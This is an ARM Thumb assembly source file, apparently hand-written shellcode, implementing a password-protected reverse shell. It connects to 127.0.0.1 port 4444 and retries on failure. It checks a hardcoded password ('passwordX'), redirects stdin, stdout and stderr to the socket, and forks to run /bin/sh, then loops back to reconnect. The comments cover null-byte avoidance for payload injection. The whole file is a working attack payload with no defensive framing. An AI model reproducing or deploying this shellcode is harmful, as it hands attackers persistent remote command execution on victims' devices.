.section .text
.global _start
_start:
 .ARM
 add   r3, pc, #1       // switch to thumb mode 
 bx    r3


.THUMB

conn:
// clocknano
delay10:
 ldrh	r3, =sleep
 ldrh	r4, =sleep+2

 mov 	r0, #1         //absolute=0 or relative1
 sub 	r1, r1        //
 ldr	r2, =sleep   //from long to word
 mov	r7, #200    //clock nanosleep SYS_CALL
 add	r7, #65
 svc	#1

// socket(2, 1, 0) 
 mov   r0, #2		 //AFINET
 mov   r1, #1		//SOCK_STREAM
 sub   r2, r2	       //IPPROTO_IP
 mov   r7, #200	      //rotation needed 
 add   r7, #81       // r7 = 281  sock SYS_CALL
 svc   #1           // r0 = sockfd
 mov   r4, r0      // save sockfd in r4



// connect(r0, &sockaddr, 16)
 adr   r1, struct         // addr, port
 strb  r2, [r1, #1]      // AF_INET [0] index
 mov   r2, #16		// SOCKET_T_ADDRLEN
 add   r7, #2          // SOCKID in R0 and SYSCALL=283
 svc   #1

 cmp 	r0,#0
 bne 	conn  // reconnect in case of connection error

// read(SOCKFD, buff, passlen)
 push {r1}
 mov r1,sp   // stack pointer
 mov r2,#9  // password lenght in bytes
 mov r7,#3 // read() SYSCALL

 readp:
 mov r0, r4
 svc #1 //SOCKFD already in r0

 checkp:
 ldr r3,pass        //load data in register
 ldr r5,[r1]       // load input into r5
 eor r3, r3, r5   // exclusive or to check match


 bne readp   //



// dup2(sockfd, 0)
 mov   r7, #63     // r7 = 63 (dup2) SYSCALL
 mov   r0, r4     // r4= sockfd
 sub   r1, r1    // r1 = 0 (stdin)
 svc   #1
// dup2(sockfd, 1)
 mov   r0, r4      // r4 is the saved sockfd
 mov   r1, #1     // r1 = 1 (stdout)
 svc   #1
// dup2(sockfd, 2)
 mov   r0, r4      // r4 is the saved sockfd
 mov   r1, #2     // r1 = 1 (stderr)
 svc   #1

//fork syscall
 mov r7, #2
 svc #1

 cmp	r0,#0
 bne	parent

// execve("/bin/sh", 0, 0) 
 adr   r0, binsh         //shell type
 sub   r2, r2           // 0 without null pointer
 sub   r1, r1	       // 0 without null pointer
 strb  r2, [r0, #7]   //  Store register byte yo get rid of X
 mov   r7, #11       // r7 = 11 (execve) 
 svc   #1

parent:

 // close(sockfd)
 mov r0, r4    // move the sockfd to r0
 mov r7, #6    // close system call
 svc #1

 b conn

struct:
.ascii "\x02\xff"      // AF_INET 0xff will be NULLed 
.ascii "\x11\x5c"     // port number 4444 
.byte 127,0,0,1      // IP Address 

binsh:
.ascii "/bin/shX"   // shell type

pass: .ascii "passwordX" //password setting

.data
sleep:
.word 1
.word 0
